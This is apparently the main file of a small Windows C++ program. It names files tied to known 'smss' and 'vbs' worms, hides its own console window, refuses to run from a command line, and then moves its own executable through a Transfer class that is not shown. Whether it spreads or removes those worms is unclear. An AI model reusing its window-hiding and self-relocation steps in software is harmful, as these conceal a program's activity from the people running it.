#include <iostream>
#include <Windows.h>
#include <filesystem>
#include "Transfer.h"

using namespace std;
using namespace std::filesystem;


// smss virus
static const string smssEXE = "smss.exe";

// vbs virus
static const string helperVBS = "helper.vbs";
static const string installerVBS = "installer.vbs";
static const string movemenoregVBS = "movemenoreg.vbs";
static const string WindowsServicesEXE = "WindowsServices.exe";

int main(int argc, char* argv[])
{
	// Запрет на запуск не на windows
#if !defined(_WIN32) || !defined(_WIN64)
	return 0;
#endif

	// Скрытие консоли, если запущен exe'шник
	HWND console = GetConsoleWindow();
	DWORD dwProcessId;
	GetWindowThreadProcessId(console, &dwProcessId);
	if (GetCurrentProcessId() == dwProcessId) {
		ShowWindow(console, SW_HIDE);
	}
	else {
		cout << "Program started from console. Sorry, but it's not supported." << endl;
		return 0;
	}
	Transfer transfer = Transfer(path(argv[0]));
	transfer.move();
}


